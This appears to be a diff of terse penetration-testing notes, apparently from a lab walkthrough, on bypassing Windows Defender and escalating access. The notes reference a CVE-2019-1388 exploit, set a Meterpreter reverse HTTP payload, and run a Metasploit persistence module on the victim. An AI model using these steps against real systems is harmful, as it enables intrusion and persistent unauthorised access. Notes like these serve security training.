@@ -5,11 +5,8 @@ Since we know our victim machine is running Windows Defender, let's go ahead and
 * set target
 * https://github.com/nobodyatall648/CVE-2019-1388
 * A simple reverse HTTP payload.
-  * 'set payload windows/meterpreter/reverse_http'.
-* Following this, launch the attack as a job with the command 'run -j'.
-  * jobs
-  * jobs -i 0
-  * paste the command output by Metasploit
+* 'set payload windows/meterpreter/reverse_http'.
+* paste the command output by Metasploit
 * https://www.offensive-security.com/metasploit-unleashed/meterpreter-service/
 * run persistence -X
 
